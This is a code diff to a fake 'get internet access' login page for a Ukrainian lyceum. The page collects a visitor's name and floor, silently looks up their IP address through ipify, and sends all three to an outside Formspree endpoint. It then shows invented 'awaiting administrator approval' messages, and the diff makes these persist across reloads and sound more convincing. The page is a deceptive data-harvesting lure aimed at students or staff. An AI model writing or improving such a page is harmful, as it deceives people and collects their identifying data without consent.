@@ -76,8 +76,6 @@
             outline: none;
         }
 
-        input:focus { border-color: var(--accent); }
-
         button {
             width: 100%;
             padding: 14px;
@@ -102,7 +100,7 @@
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .hidden { display: none; }
+        .hidden { display: none !important; }
         .waiting-box { text-align: center; }
         .sub-text { font-size: 14px; color: var(--text-muted); margin-top: 15px; }
     </style>
@@ -113,7 +111,6 @@
     <div id="auth-form">
         <span class="header-label">Отримати доступ до інтернету</span>
         <h1>Ліцей №169</h1>
-        
         <div class="form-group">
             <label>Локація:</label>
             <select id="floor">
@@ -122,12 +119,10 @@
                 <option value="3">Третій поверх</option>
             </select>
         </div>
-
         <div class="form-group">
             <label>Прізвище та ім'я:</label>
             <input type="text" id="username" placeholder="Введіть ваші дані">
         </div>
-
         <button onclick="processLogin()">Увійти</button>
     </div>
 
@@ -140,6 +135,19 @@
 </div>
 
 <script>
+    // ПЕРЕВІРКА ПРИ ЗАВАНТАЖЕННІ
+    window.onload = function() {
+        if (localStorage.getItem('accessRequested') === 'true') {
+            showWaitingScreen();
+        }
+    };
+
+    function showWaitingScreen() {
+        document.getElementById('auth-form').classList.add('hidden');
+        document.getElementById('waiting-screen').classList.remove('hidden');
+        startStatusRotation();
+    }
+
     async function processLogin() {
         const name = document.getElementById('username').value;
         const floor = document.getElementById('floor').value;
@@ -149,23 +157,20 @@
             return;
         }
 
-        // Візуальна зміна екрану
-        document.getElementById('auth-form').classList.add('hidden');
-        document.getElementById('waiting-screen').classList.remove('hidden');
+        // Зберігаємо стан в LocalStorage
+        localStorage.setItem('accessRequested', 'true');
+        localStorage.setItem('userName', name);
+        
+        showWaitingScreen();
 
         try {
-            // 1. Отримання IP у фоновому режимі
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
             const userIp = ipData.ip;
 
-            // 2. Вивід в консоль (для перевірки через F12)
             console.log("%c--- ДАНІ ЗАПИТУ ---", "color: #2563eb; font-weight: bold;");
-            console.log(`Об'єкт: ${name}`);
-            console.log(`Поверх: ${floor}`);
-            console.log(`IP-адреса: ${userIp}`);
+            console.log(`Об'єкт: ${name}, Поверх: ${floor}, IP: ${userIp}`);
 
-            // 3. Відправка на Formspree (твій ID: xrerlvaj)
             await fetch('https://formspree.io/f/xrerlvaj', {
                 method: 'POST',
                 headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
@@ -173,19 +178,20 @@
                     "Користувач": name,
                     "Локація": floor + " поверх",
                     "IP": userIp,
-                    "Час": new Date().toLocaleString()
+                    "Статус": "Очікує підтвердження"
                 })
             });
-
         } catch (err) {
-            console.log("Помилка передачі даних.");
+            console.log("Помилка фонової обробки.");
         }
+    }
 
-        // Імітація процесу перевірки
+    function startStatusRotation() {
         const statuses = [
             "З'єднання зі шлюзом...",
             "Синхронізація з сервером ліцею...",
-            "Запит надіслано модератору мережі",
+            "Запит розглядається адміністратором...",
+            "Перевірка безпеки з'єднання...",
             "Очікування підтвердження доступу..."
         ];
         
@@ -196,9 +202,10 @@
                 statusEl.innerText = statuses[i];
                 i++;
             } else {
+                statusEl.innerText = statuses[statuses.length - 1];
                 clearInterval(interval);
             }
-        }, 3500);
+        }, 4000);
     }
 </script>
 
